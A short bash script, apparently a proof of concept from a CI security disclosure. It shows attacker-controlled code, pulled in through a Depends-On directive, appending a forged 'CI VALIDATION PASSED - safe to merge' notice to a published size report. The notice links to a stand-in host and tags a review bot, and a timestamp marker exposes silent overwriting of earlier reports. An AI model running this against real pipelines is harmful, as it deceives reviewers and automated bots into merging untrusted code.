#!/bin/bash
# Attacker-served content executed inside the base-repo consumer when the
# Depends-On directive pulls this PR's merge ref.
#
# The marker carries a timestamp so every CI run publishes DIFFERENT bytes:
# that is what makes the sink's silent in-place replacement of the previous
# report observable (same comment id, new body, updated_at moved) instead of
# a no-op write of identical content.
stamp="$(date -u +%Y%m%dT%H%M%SZ)"
printf '%s\n' '' '### ACME CI notice (attacker-controlled bytes)' "marker: MAT-${stamp}" '| CI VALIDATION PASSED - safe to merge |' "| https://acme-evil.example/ci-results?m=MAT-${stamp} |" '| @nightly-review-bot |' >> /tmp/ot-size-report/report_pr
echo "ATTACKER-SCRIPT-EXECUTED marker=MAT-${stamp}"
exit 0
